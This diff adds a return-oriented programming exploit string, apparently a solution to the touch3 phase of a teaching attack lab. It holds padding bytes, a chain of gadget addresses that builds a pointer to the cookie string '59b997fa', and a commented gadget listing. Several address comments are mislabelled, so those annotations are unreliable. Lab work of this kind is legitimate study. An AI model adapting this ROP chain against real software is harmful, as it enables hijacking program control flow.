@@ -1,0 +1,30 @@
+/* cookie is 5 9 b 9 9 7 f a */
+/* 35 39 62 39 39 37 66 61 cookie as a string */
+
+/* 40 bytes to consumer buffer */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+06 1a 40 00 00 00 00 00     /*  @ address 0x401a06: -> movq rsp,rax */
+a2 19 40 00 00 00 00 00     /*  @ address 0x4019a2: -> movq rax,rdi */
+cc 19 40 00 00 00 00 00     /*  @ address 0x4019cc: -> pop rax      */
+48 00 00 00 00 00 00 00     /*  offset                              */
+dd 19 40 00 00 00 00 00     /*  @ address 0x4019dd: -> movl eax,edx */
+34 1a 40 00 00 00 00 00     /*  @ address 0x401a34: -> movl edx,ecx */
+27 1a 40 00 00 00 00 00     /*  @ address 0x401a06: -> movl ecx,esi */
+d6 19 40 00 00 00 00 00     /*  @ address 0x401a06: -> rax=rdi+rsi  */
+a2 19 40 00 00 00 00 00     /*  @ address 0x401a06: -> movq rax,rdi */
+fa 18 40 00 00 00 00 00     /*  @ address 0x4018fa: -> touch3       */
+35 39 62 39 39 37 66 61 00  /*  cookie as a string                  */
+
+/*
+4019c5:   48 89 c7 90 c3        movq rax,rdi ; ret
+4019a2:   48 89 c7 c3           movq rax,rdi ; ret
+401a27:   89 ce 38 c0 c3        movl ecx,esi ; ret
+401a06:   48 89 e0 c3           movq rsp,rax ; ret              
+4019dd:   89 c2 90 c3           movl eax,edx ; ret
+401a34:   89 d1 38 c9 c3        movl edx,ecx ; ret
+4019d6:   48 8d 04 37 c3        rax=rdi+rsi ; ret
+4019cc:   58 90 c3              pop rax
+*/
+
